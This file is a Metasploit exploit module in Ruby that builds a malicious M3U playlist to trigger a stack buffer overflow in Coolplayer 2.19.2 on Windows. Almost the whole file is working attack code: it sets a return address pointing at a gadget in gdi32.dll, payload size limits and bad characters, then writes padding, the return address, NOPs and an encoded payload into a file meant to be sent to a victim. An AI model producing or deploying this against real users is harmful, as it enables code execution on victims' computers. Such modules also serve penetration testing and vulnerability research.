##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Coolplayer 2.19.2 (M3U File) Stack Buffer Overflow',
			'Description'    => %q{ 
					This module exploits a stack-based buffer overflow in Coolplayer 2.19.2.  An attacker must send the file to the victim and the victim must open the file.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 
					      'Securityxxxpert',      # Initial Discovery
					      'James Fitts' # Metasploit Module
					    ],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/17294' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 268,
					'BadChars' => "\x00\x0a\x0d",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x77f31d8a } ], #p/p/r in gdi32.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'May 16 2011',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msf.m3u']),
				], self.class)
	end

	def exploit

		m3u = rand_text_alpha_upper(220) + [target.ret].pack('V')
		m3u << make_nops(12)
		m3u << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(m3u)

	end

end